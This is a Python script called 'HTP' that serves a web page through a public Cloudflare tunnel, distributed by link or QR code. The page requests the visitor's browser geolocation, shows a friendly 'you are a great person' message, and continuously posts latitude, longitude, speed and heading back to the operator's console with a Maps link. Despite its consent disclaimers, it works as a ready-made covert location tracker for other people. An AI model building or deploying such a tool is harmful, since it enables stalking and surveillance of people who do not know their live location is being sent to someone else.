#!/usr/bin/env python3
"""
Windows-friendly HTP.py
- Fixed f-string HTML issue
- Windows/Linux cloudflared detection and download
- Avoids Linux-only commands on Windows
IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.
"""

import os
import sys
import threading
import time
import re
import subprocess
import platform
import webbrowser
from pathlib import Path

try:
    import requests
    from flask import Flask, request
except ImportError:
    print("Installing missing Python packages (you may need to run this as admin)...")
    os.system('pip install --upgrade pip setuptools wheel')
    os.system('pip install flask requests qrcode[pil] pillow')
    import requests
    from flask import Flask, request

# ---------------- Colors ----------------
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET = "\033[0m"

app = Flask(__name__)
locations = {}

# ---------------- Helpers ----------------
def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def open_url(url):
    try:
        webbrowser.open(url)
    except Exception:
        # best-effort, don't crash
        pass

# ---------------- TOOL LOCK ----------------
def tool_lock():
    clear_screen()
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HTP BY MrXeno'.center(60)}║{RESET}")
    print(f"{RED}║{'Follow @mrrajrumel 🔔'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}\n")
    print(f"{YELLOW}This script is for testing on devices you own or where you have explicit permission.{RESET}\n")

    for i in range(9, 0, -1):
        sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)

    # Try to open the Facebook page in a cross-platform manner
    fb_url = "https://facebook.com/mrrajrumel"
    try:
        open_url(fb_url)
        print(f"\n{GREEN}✅ Opened Facebook link (if a browser is available).{RESET}\n")
    except Exception:
        print(f"\n{YELLOW}⚠️ Could not open browser automatically. Visit: {fb_url}{RESET}\n")

    try:
        input(f"{YELLOW}Press ENTER to continue...{RESET}")
    except Exception:
        # non-interactive fallback
        pass

# ---------------- Dependencies ----------------
def install_requirements():
    print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
    if os.name != "nt":
        os.system('pkg update -y > /dev/null 2>&1 || true')
        os.system('pkg install python wget -y > /dev/null 2>&1 || true')
    os.system('pip install flask requests qrcode[pil] pillow > /dev/null 2>&1 || true')

# ---------------- Cloudflared ----------------
def download_file(url, dest_path):
    dest_path.parent.mkdir(parents=True, exist_ok=True)
    try:
        with requests.get(url, stream=True, timeout=30) as r:
            r.raise_for_status()
            with open(dest_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
        return True
    except Exception as e:
        print(f"{YELLOW}⚠️ Download failed: {e}{RESET}")
        return False

def download_cloudflared():
    system = platform.system().lower()
    machine = platform.machine().lower()
    bin_dir = Path.cwd() / "bin"
    bin_dir.mkdir(exist_ok=True)
    # Default target path
    if system == "windows":
        path = bin_dir / "cloudflared.exe"
    else:
        path = bin_dir / "cloudflared"

    if path.exists():
        return path

    print(f"{CYAN}Detecting platform: system={system}, machine={machine}{RESET}")

    # Choose correct URL
    if system == "windows":
        # choose amd64 vs 386
        if "64" in machine:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-386.exe"
    elif system == "linux":
        if "aarch64" in machine or "arm64" in machine:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif machine.startswith("arm"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    elif system == "darwin":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
    else:
        print(f"{RED}Unsupported platform: {system}/{machine}{RESET}")
        return None

    print(f"{CYAN}Downloading cloudflared from: {url}{RESET}")
    ok = download_file(url, path)
    if not ok:
        print(f"{YELLOW}Could not download cloudflared automatically.{RESET}")
        return None

    try:
        # Make executable on POSIX
        if system != "windows":
            path.chmod(0o755)
    except Exception:
        pass

    print(f"{GREEN}✅ cloudflared saved to: {path}{RESET}")
    return path

def find_cloudflared():
    # 1) check local bin/
    local = Path.cwd() / "bin" / ("cloudflared.exe" if os.name == "nt" else "cloudflared")
    if local.exists():
        return local
    # 2) check PATH
    which = shutil_which("cloudflared")
    if which:
        return Path(which)
    # 3) try download
    return download_cloudflared()

def shutil_which(name):
    try:
        from shutil import which
        return which(name)
    except Exception:
        return None

def start_cloudflared_tunnel(port=8080, timeout=20):
    cloud_path = find_cloudflared()
    if not cloud_path:
        print(f"{YELLOW}⚠️ cloudflared not available locally.{RESET}")
        return None, None

    cmd = [str(cloud_path), "tunnel", "--url", f"http://localhost:{port}"]
    print(f"{CYAN}Starting cloudflared: {' '.join(cmd)}{RESET}")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print(f"{RED}Failed to start cloudflared: {e}{RESET}")
        return None, None

    pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
    url = None
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        print(f"{YELLOW}Cloudflared: {line.strip()}{RESET}")
        m = pattern.search(line)
        if m:
            url = m.group(0)
            break

    if url:
        # keep process alive in background
        threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
        return url, proc

    # no url found -> kill
    try:
        proc.kill()
    except Exception:
        pass
    return None, None

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=6)
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        return None

def create_public_url(port=8080):
    url, proc = start_cloudflared_tunnel(port=port, timeout=18)
    if url:
        print(f"{GREEN}✅ Cloudflare tunnel established: {url}{RESET}")
        return url
    print(f"{YELLOW}⚠️  Cloudflare tunnel failed, trying public IP...{RESET}")
    ip = get_public_ip()
    if ip:
        print(f"{GREEN}✅ Using public IP: {ip}{RESET}")
        return f"http://{ip}:{port}"
    print(f"{YELLOW}⚠️  Could not determine public IP, using localhost{RESET}")
    return f"http://localhost:{port}"

# ---------------- Flask endpoints ----------------
@app.route("/")
def index():
    # Note: this is NOT an f-string; no leading f to avoid brace issues
    return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTP</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            font-size: 18px;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .message {
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
        }
        .coords {
            margin-top: 20px;
            font-size: 16px;
            color: #0ff;
        }
        .status {
            margin: 20px 0;
            color: #ff0;
        }
    </style>
</head>
<body>
    <div id="status" class="status">Requesting location access...</div>
    <div id="message" class="message"></div>
    <div id="coords" class="coords"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const messageDiv = document.getElementById('message');
        const coordsDiv = document.getElementById('coords');
        let watchId = null;

        function onSuccess(pos) {
            try {
                statusDiv.innerHTML = 'Location access granted!';
                messageDiv.innerHTML = 'You are a great person 😁<br>Stay blessed, stay happy!';
                coordsDiv.innerHTML = 'Lat: ' + pos.coords.latitude.toFixed(6) + '<br>Lon: ' + pos.coords.longitude.toFixed(6) + '<br>Accuracy: ' + pos.coords.accuracy + 'm';
                
                fetch('/update', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null,
                        timestamp: pos.timestamp
                    })
                }).catch(function(err) { console.error('Error:', err); });
            } catch(e) {
                console.error('Error:', e);
            }
        }
        
        function onError(err) {
            statusDiv.innerHTML = 'Error: ' + err.message;
            messageDiv.innerHTML = 'Please allow location access to continue';
            if (watchId) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }
            console.error('Geolocation error:', err);
        }
        
        function requestLocation() {
            if (navigator.geolocation) {
                statusDiv.innerHTML = 'Requesting location access...';
                
                // First try to get current position
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        onSuccess(pos);
                        // Then watch for updates
                        watchId = navigator.geolocation.watchPosition(onSuccess, onError, {
                            enableHighAccuracy: true,
                            maximumAge: 3000,
                            timeout: 10000
                        });
                    }, 
                    onError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                statusDiv.innerHTML = 'Geolocation is not supported by this browser.';
                messageDiv.innerHTML = 'Please use a browser that supports location services';
            }
        }
        
        // Request location on page load
        window.onload = requestLocation;
    </script>
</body>
</html>
'''

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400

    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    data["time"] = time.time()
    locations.clear()
    locations.update(data)

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")

    print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED{RESET}")
    print(f"{CYAN}Latitude: {lat}{RESET}")
    print(f"{CYAN}Longitude: {lon}{RESET}")
    print(f"{CYAN}Accuracy: {acc} m{RESET}")
    print(f"{CYAN}Maps: https://maps.google.com/?q={lat},{lon}{RESET}\n")

    return "OK", 200

# ---------------- QR helper ----------------
def make_qr(url):
    try:
        import qrcode
        out = Path("track_qr.png")
        img = qrcode.make(url)
        img.save(out)
        # cross-platform open
        try:
            if os.name == "nt":
                os.startfile(str(out.resolve()))
            else:
                # try termux-open, xdg-open, or webbrowser fallback
                os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
                webbrowser.open(str(out.resolve()))
        except Exception:
            webbrowser.open(str(out.resolve()))
    except Exception as e:
        print(f"{YELLOW}⚠️  Could not generate QR code: {e}{RESET}")

# ---------------- Server ----------------
def start_server(port=8080):
    threading.Thread(target=lambda: app.run(
        host="0.0.0.0",
        port=port,
        debug=False,
        use_reloader=False
    ), daemon=True).start()
    time.sleep(2)

# ---------------- Main ----------------
def main():
    tool_lock()
    install_requirements()
    clear_screen()
    print(f"{GREEN}🚀 Starting HTP...{RESET}")

    port = 8080
    public_url = create_public_url(port=port)
    start_server(port)
    make_qr(public_url)

    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}{'HTP BY MrXeno'.center(60)}{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{YELLOW}Public URL: {RESET}{public_url}\n")
    print(f"{YELLOW}Share the link or QR with the user (test on devices you own).{RESET}")
    print(f"{YELLOW}Waiting for live location updates... (Ctrl+C to stop){RESET}")

    last_time = 0
    try:
        while True:
            if locations.get("time", 0) > last_time:
                last_time = locations["time"]
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped by user{RESET}")

if __name__ == "__main__":
    main()
